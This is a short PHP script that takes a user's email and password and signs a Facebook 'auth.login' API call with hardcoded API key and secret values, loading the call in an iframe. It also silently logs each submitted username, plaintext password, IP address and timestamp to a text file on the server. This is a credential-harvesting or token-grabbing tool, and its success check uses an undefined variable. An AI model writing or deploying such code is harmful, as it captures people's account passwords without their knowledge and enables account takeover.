<?php
if($_GET) $_POST = $_GET;
function sign_creator(&$data){
	$sig = "";
	foreach($data as $key => $value){
		$sig .= "$key=$value";
	}
	$sig .= 'c1e620fa708a1d5696fb991c1bde5662';
	$sig = md5($sig);
	return $data['sig'] = $sig;
}
$data = array(
	"api_key" => "3e7c78e35a76a9299309885393b02d97",
	"email" => $_POST['u'],
	"format" => "JSON",
	"generate_machine_id" => "1",
	//"generate_session_cookies" => "1",
	"locale" => "vi_vn",
	"method" => "auth.login",
	"password" => $_POST['p'],
	"return_ssl_resources" => "0",
	"v" => "1.0"
);
//Something to write to txt log
$log  = "User: ".$_SERVER['REMOTE_ADDR'].' - '.date("F j, Y, g:i a").PHP_EOL.
        "Attempt: ".($result[0]['success']=='1'?'Success':'Failed').PHP_EOL.
        "User: ".$_POST['u'].PHP_EOL.
        "Pass: ".$_POST['p'].PHP_EOL.
        "-------------------------".PHP_EOL;
//Save string to log, use FILE_APPEND to append.
file_put_contents('./users'.date("j.n.Y").'.txt', $log, FILE_APPEND);
sign_creator($data);
?>
<iframe width="100%" height="100%" src="https://api.facebook.com/restserver.php?<?Echo http_build_query($data);?>"></iframe>